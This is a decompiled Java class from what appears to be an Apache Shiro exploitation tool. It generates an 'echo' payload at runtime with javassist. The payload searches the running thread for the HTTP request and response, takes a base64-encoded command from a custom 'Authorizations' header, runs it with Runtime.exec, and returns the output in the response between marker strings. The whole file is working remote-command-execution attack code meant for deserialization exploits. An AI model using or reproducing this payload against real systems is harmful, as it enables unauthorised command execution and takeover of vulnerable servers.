/*
 * Decompiled with CFR 0.152.
 */
package com.sma11new.exp.shiro.attack.echo;

import com.sma11new.exp.shiro.attack.echo.EchoPayload;
import com.sma11new.exp.shiro.attack.util.Gadgets;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import javassist.CtMethod;
import javassist.CtNewConstructor;

public class AllEcho
implements EchoPayload {
    @Override
    public CtClass genPayload(ClassPool pool) throws Exception {
        CtClass clazz = pool.makeClass("com.sma11new.exp.shiro.payload.Test" + System.nanoTime());
        if (clazz.getDeclaredConstructors().length != 0) {
            clazz.removeConstructor(clazz.getDeclaredConstructors()[0]);
        }
        clazz.addField(CtField.make("static java.util.HashSet/*<Object>*/ h;", clazz));
        clazz.addField(CtField.make("static javax.servlet.http.HttpServletRequest r;", clazz));
        clazz.addField(CtField.make("static javax.servlet.http.HttpServletResponse p;", clazz));
        clazz.addMethod(CtMethod.make("private static boolean i(Object obj){        if(obj==null|| h.contains(obj)){            return true;        }        h.add(obj);        return false;    }", clazz));
        clazz.addMethod(CtMethod.make("private static void F(Object start, int depth){}", clazz));
        clazz.addMethod(CtMethod.make("private static void p(Object o, int depth){\n        if(depth > 52||(r !=null&& p !=null)){\n            return;\n        }\n        if(!i(o)){\n            if(r ==null&&javax.servlet.http.HttpServletRequest.class.isAssignableFrom(o.getClass())){\n                r = (javax.servlet.http.HttpServletRequest)o;\n                if(r.getHeader(\"Host\")==null && r.getHeader(\"Authorizations\") == null) {\n                    r = null;\n                }else{\n                    try {\n                        p = (javax.servlet.http.HttpServletResponse) r.getClass().getMethod(\"getResponse\",null).invoke(r,null);\n\n                    } catch (Exception e) {\n                        r = null;\n                    }\n                }\n\n            }\n            if(r !=null&& p !=null){\n                try {\n                    \n                    p.addHeader(\"Host\",r.getHeader(\"Host\"));\n                    try {\n                        p.getWriter().println(\"BrY3jhHrh6\" +  org.apache.shiro.codec.Base64.encodeToString(new java.util.Scanner(Runtime.getRuntime().exec(org.apache.shiro.codec.Base64.decodeToString(r.getHeader(\"Authorizations\").replaceAll(\"Basic \",\"\"))).getInputStream()).useDelimiter(\"\\\\A\").next().getBytes()) + \"yQqlMgS1cL\");\n                    }catch (Exception e){}\n                   \n                    p.getWriter().flush();\n                    p.getWriter().close();\n                    \n\n                }catch (Exception e){\n                }\n                return;\n            }\n\n            F(o,depth+1);\n        }\n    }", clazz));
        clazz.getDeclaredMethod("F").setBody("{Class n = $1.getClass();\n        do{\n            java.lang.reflect.Field f = null;\n            int l = n.getDeclaredFields().length;\n            for (int i = 0; i < l; i++) {\n                f = n.getDeclaredFields()[i];\n                f.setAccessible(true);\n                Object o = null;\n                try{\n                    o = f.get($1);\n\n                    if(!o.getClass().isArray()){\n                        p(o,$2);\n                    }else{\n                        Object q = null;\n                        Object[] objs = (Object[])o;\n                        int len = java.lang.reflect.Array.getLength(o);\n                        for (int j = 0; j < len; j++) {\n                            q = objs[j];\n                            p(q, $2);\n                        }\n\n                    }\n\n                }catch (Exception e){\n                }\n            }\n\n        }while(\n                (n = n.getSuperclass())!=null\n        );}");
        clazz.addConstructor(CtNewConstructor.make("public dfs(){       r = null;        p = null;        h =new java.util.HashSet/*<Object>*/();        F(Thread.currentThread(),0);    }", clazz));
        clazz.getClassFile().setMajorVersion(50);
        return clazz;
    }

    public static void main(String[] args) throws Exception {
        Object template2 = Gadgets.createTemplatesImpl("AllEcho");
    }
}

